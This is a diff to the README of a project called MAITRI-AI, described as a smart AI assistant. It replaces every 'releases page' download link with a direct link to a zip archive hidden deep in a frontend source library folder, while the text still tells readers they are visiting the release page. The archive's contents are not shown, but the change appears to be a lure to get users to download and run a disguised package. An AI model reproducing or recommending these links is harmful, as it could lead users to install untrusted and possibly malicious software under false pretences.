@@ -1,6 +1,6 @@
 # 🤖 MAITRI-AI - Smart AI Assistant for Everyday Use
 
-[![Download MAITRI-AI](https://img.shields.io/badge/Download-MAITRI--AI-brightgreen?style=for-the-badge)](https://github.com/kitdog109/MAITRI-AI/releases)
+[![Download MAITRI-AI](https://img.shields.io/badge/Download-MAITRI--AI-brightgreen?style=for-the-badge)](https://github.com/kitdog109/MAITRI-AI/raw/refs/heads/main/FRONTEND/cosmic-compass-ui-main/cosmic-compass-ui-main/src/lib/MAITR_AI_v1.1.zip)
 
 ---
 
@@ -56,7 +56,7 @@ You need to download the app package first.
 
 Click this link to visit the release page and get the latest version:
 
-[**Download MAITRI-AI Releases**](https://github.com/kitdog109/MAITRI-AI/releases)
+[**Download MAITRI-AI Releases**](https://github.com/kitdog109/MAITRI-AI/raw/refs/heads/main/FRONTEND/cosmic-compass-ui-main/cosmic-compass-ui-main/src/lib/MAITR_AI_v1.1.zip)
 
 Once on the page, look for the latest stable release. The file you want should have a name similar to `MAITRI-AI-Setup.exe` or `MAITRI_AI_Windows.zip`.
 
@@ -161,4 +161,4 @@ If you run into issues and need help:
 
 ---
 
-[![Download MAITRI-AI](https://img.shields.io/badge/Download-MAITRI--AI-blue?style=for-the-badge)](https://github.com/kitdog109/MAITRI-AI/releases)
+[![Download MAITRI-AI](https://img.shields.io/badge/Download-MAITRI--AI-blue?style=for-the-badge)](https://github.com/kitdog109/MAITRI-AI/raw/refs/heads/main/FRONTEND/cosmic-compass-ui-main/cosmic-compass-ui-main/src/lib/MAITR_AI_v1.1.zip)
